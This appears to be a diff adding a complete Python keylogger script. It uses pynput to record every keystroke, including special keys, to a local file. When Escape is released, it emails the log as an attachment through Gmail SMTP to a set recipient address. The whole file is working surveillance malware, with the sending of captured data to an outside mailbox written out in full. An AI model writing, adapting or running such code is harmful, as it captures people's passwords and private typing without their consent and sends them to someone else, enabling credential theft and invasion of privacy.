@@ -1,0 +1,86 @@
+from pynput.keyboard import Key, Listener
+import smtplib
+import os
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart  # Add this import
+from email.mime.base import MIMEBase
+from email import encoders
+
+
+def send_log_file(log_file_path):
+    email_user = 'sender@gmail.com'  # Your Gmail address
+    email_password = 'app_password'   # The app password you generated
+    email_send = 'recieptient@gmail.com'  # Your email or any email you can access
+
+    print(f"Email: {email_user}")
+    # Avoid printing the password in production code; this is just for debugging.
+    # print(f"Password: {email_password}")
+
+    subject = 'Keylogger Log File'
+    body = 'Attached is the keylogger log file.'
+
+    # Create the email as a multipart message
+    msg = MIMEMultipart()
+    msg['From'] = email_user
+    msg['To'] = email_send
+    msg['Subject'] = subject
+
+    # Add body to email
+    msg.attach(MIMEText(body, 'plain'))
+
+    # Attach the log file
+    try:
+        attachment = open(log_file_path, 'rb')
+        part = MIMEBase('application', 'octet-stream')
+        part.set_payload(attachment.read())
+        encoders.encode_base64(part)
+        part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(log_file_path)}')
+        msg.attach(part)
+        attachment.close()  # Close the file after reading
+    except Exception as e:
+        print(f"Error attaching file: {e}")
+
+    # Send the email
+    try:
+        with smtplib.SMTP('smtp.gmail.com', 587) as server:
+            server.starttls()
+            server.login(email_user, email_password)
+            server.send_message(msg)
+            print("Email sent successfully.")
+    except Exception as e:
+        print(f"Failed to send email: {e}")
+
+def on_press(key):
+    try:
+        # Log regular key presses
+        with open("key_log.txt", "a") as log_file:
+            log_file.write(key.char)
+    except AttributeError:
+        # Handle special keys (like space, tab, etc.)
+        with open("key_log.txt", "a") as log_file:
+            # Replace special keys with more readable equivalents
+            if key == Key.space:
+                log_file.write(" ")
+            elif key == Key.enter:
+                log_file.write("\n")
+            elif key == Key.tab:
+                log_file.write("\t")
+            elif key == Key.backspace:
+                log_file.write("[BACKSPACE]")
+            elif key == Key.shift:
+                log_file.write("[SHIFT]")
+            elif key == Key.alt_l or key == Key.alt_gr:
+                log_file.write("[ALT]")
+            elif key == Key.esc:
+                log_file.write("[ESC]")
+            else:
+                log_file.write(f"[{key}]")
+
+def on_release(key):
+    if key == Key.esc:
+        # Send the log file when the script ends
+        send_log_file('key_log.txt')
+        return False  # Stop listener
+
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
